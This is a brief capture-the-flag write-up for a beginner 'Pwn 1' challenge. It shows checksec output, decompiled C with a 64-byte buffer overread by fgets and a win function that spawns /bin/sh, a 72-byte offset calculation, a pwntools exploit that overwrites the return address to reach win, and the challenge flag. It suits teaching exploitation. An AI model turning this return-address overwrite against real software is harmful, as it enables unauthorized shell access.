# **Pwn 1**
Textbook buffer overflow with win function

I apparently first blooded this one LOL

# Executable
checksec :
```
[*] '/home/skuuk/n00bz/pwn1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
decompilation :
```C
void main(EVP_PKEY_CTX *param_1)
{
  char local_48 [64];
  
  init(param_1);
  puts("Would you like a flag?");
  fgets(local_48,0x50,stdin);
  system("cat fake_flag.txt");
  return;
}

void win(void)

{
  system("/bin/sh");
  return;
}
```
no canary, the only local on the stack is the buffer `local_48` itself so the returned address is at offset `64 + 8 = 72` 
(counting 8 bytes for the saved `rbp`)
# Exploit
```python
io = start()
io.sendline(b"a" * 72 + p64(exe.symbols['win']))
io.sendline("cat flag.txt")
io.interactive()
```
# Flag
```
n00bz{PWN_1_Cl34r3d_n0w_0nt0_PWN_2!!!}
```